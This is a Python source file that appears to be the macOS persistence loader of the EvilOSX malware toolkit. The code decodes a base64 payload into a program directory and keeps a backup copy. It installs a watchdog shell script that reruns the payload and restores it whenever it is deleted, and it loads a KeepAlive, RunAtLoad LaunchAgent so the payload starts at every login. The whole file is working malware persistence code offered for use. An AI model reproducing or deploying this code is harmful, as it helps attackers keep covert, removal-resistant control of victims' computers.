# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import base64
import logging
import os
import subprocess
import sys
from textwrap import dedent

# ============================================================
# These variables will be patched when this loader is created.
LOADER_OPTIONS = {}
PAYLOAD_BASE64 = ""
# ============================================================

PROGRAM_DIRECTORY = os.path.expanduser(LOADER_OPTIONS.get("program_directory", ""))
LAUNCH_AGENT_NAME = LOADER_OPTIONS.get("launch_agent_name", "")
PAYLOAD_FILENAME = LOADER_OPTIONS.get("payload_filename", "")
WATCHDOG_FILENAME = "watchdog.sh"
STOP_FILENAME = ".stop"
BACKUP_FILENAME = PAYLOAD_FILENAME + ".bak"

# Logging
logging.basicConfig(format="[%(levelname)s] %(funcName)s:%(lineno)s - %(message)s", level=logging.DEBUG)
log = logging.getLogger("launch_daemon")

log.debug("Program directory: " + PROGRAM_DIRECTORY)
log.debug("Launch agent name: " + LAUNCH_AGENT_NAME)
log.debug("Payload filename: " + PAYLOAD_FILENAME)


# ---------------------------------------------------------------------------
# Shell helpers
# ---------------------------------------------------------------------------
def run_command(command):
    """Runs a system command and returns (return_code, output).

    :type command: str
    :rtype: tuple[int, str]
    """
    try:
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True
        )
        output = process.communicate()[0]
        if isinstance(output, bytes):
            output = output.decode("utf-8", errors="replace")
        return process.returncode, (output or "")
    except Exception as ex:
        return -1, str(ex)


def get_program_file():
    """:return: The path to the payload file."""
    return os.path.join(PROGRAM_DIRECTORY, PAYLOAD_FILENAME)


def get_watchdog_file():
    """:return: The path to the watchdog script."""
    return os.path.join(PROGRAM_DIRECTORY, WATCHDOG_FILENAME)


def get_backup_file():
    """:return: The path to the payload backup used for self-repair."""
    return os.path.join(PROGRAM_DIRECTORY, BACKUP_FILENAME)


def get_stop_file():
    """:return: The path to the stop flag file."""
    return os.path.join(PROGRAM_DIRECTORY, STOP_FILENAME)


def get_launch_agent_directory():
    """:return: The directory where the launch agent lives."""
    return os.path.expanduser("~/Library/LaunchAgents")


def get_launch_agent_file():
    """:return: The path to the launch agent."""
    return os.path.join(get_launch_agent_directory(), LAUNCH_AGENT_NAME + ".plist")


# ---------------------------------------------------------------------------
# Unload any pre-existing instance before (re)installing.
# ---------------------------------------------------------------------------
rc, out = run_command("launchctl remove " + LAUNCH_AGENT_NAME)

# Create directories - verify they actually exist afterwards.
run_command("mkdir -p " + PROGRAM_DIRECTORY)
run_command("mkdir -p " + get_launch_agent_directory())

if not os.path.isdir(PROGRAM_DIRECTORY):
    log.error("Could not create program directory: " + PROGRAM_DIRECTORY)
    print("Failed to create program directory: " + PROGRAM_DIRECTORY)
    sys.exit(1)

if not os.path.isdir(get_launch_agent_directory()):
    log.error("Could not create launch agent directory.")
    print("Failed to create the LaunchAgents directory.")
    sys.exit(1)

# Write the payload and a backup copy used for self-repair.
pfp = get_program_file()
bfp = get_backup_file()
payload = base64.b64decode(PAYLOAD_BASE64)

with open(pfp, "wb") as output_file:
    output_file.write(payload)
os.chmod(pfp, 0o777)

with open(bfp, "wb") as output_file:
    output_file.write(payload)

# Watchdog: keeps the payload alive and re-copies it from the backup if it is
# ever removed or tampered with. A .stop flag allows clean uninstall.
watchdog = dedent("""\
    #!/bin/sh
    # Watchdog for the persistent payload.
    # Restarts the payload if it exits and self-repairs it from the backup.
    PROGRAM_DIR="%s"
    PAYLOAD="%s"
    BACKUP="%s"
    STOP="%s"

    find_python3() {
        for c in python3 /usr/bin/python3 /usr/local/bin/python3 /opt/homebrew/bin/python3; do
            if command -v "$c" >/dev/null 2>&1; then
                command -v "$c"
                return 0
            fi
            if [ -x "$c" ]; then
                echo "$c"
                return 0
            fi
        done
        return 1
    }
    PY3=$(find_python3)


    while true; do
        # A stop file signals an intentional teardown; leave gracefully.
        if [ -f "$STOP" ]; then
            exit 0
        fi

        # Self-repair: restore the payload from the backup if it disappeared.
        if [ ! -f "$PAYLOAD" ] && [ -f "$BACKUP" ]; then
            cp "$BACKUP" "$PAYLOAD" 2>/dev/null
            chmod 777 "$PAYLOAD" 2>/dev/null
        fi

        if [ -f "$PAYLOAD" ]; then
            if [ -n "$PY3" ]; then
                "$PY3" "$PAYLOAD"
            else
                "$PAYLOAD"
            fi
        fi
        sleep 2
    done
    """) % (PROGRAM_DIRECTORY, pfp, bfp, get_stop_file())

with open(get_watchdog_file(), "w") as output_file:
    output_file.write(watchdog)
os.chmod(get_watchdog_file(), 0o777)

# launch agent: point at /bin/sh watchdog.sh, KeepAlive + RunAtLoad preserved.
launch_agent_create = dedent("""\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>KeepAlive</key>
    <true/>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""") % (LAUNCH_AGENT_NAME, get_watchdog_file())

launch_agent_file = get_launch_agent_file()
with open(launch_agent_file, "w") as output_file:
    output_file.write(launch_agent_create)

# Validate the plist with plutil before loading it (macOS only).
plutil_rc, plutil_out = run_command("plutil -lint " + launch_agent_file)
if plutil_rc != 0:
    log.error("Invalid plist generated: " + plutil_out.strip())
    print("Generated launch agent is invalid, aborting.")
    sys.exit(1)

# Load the launch agent.
rc2, output2 = run_command("launchctl load -w " + launch_agent_file)

if "already loaded" in output2.lower():
    # If it is already loaded the watchdog takes over the existing job.
    print("EvilOSX launch agent already loaded; rearmed watchdog.")
elif rc2 != 0:
    # Fall back to load (older launchctl) semantics already attempted; report.
    log.error("Unexpected output: " + output2.strip())
    print("Failed to load launch agent: " + output2.strip())
    sys.exit(1)
else:
    print("Launch agent loaded.")

print("EvilOSX installed: payload=%s watchdog=%s" % (pfp, get_watchdog_file()))
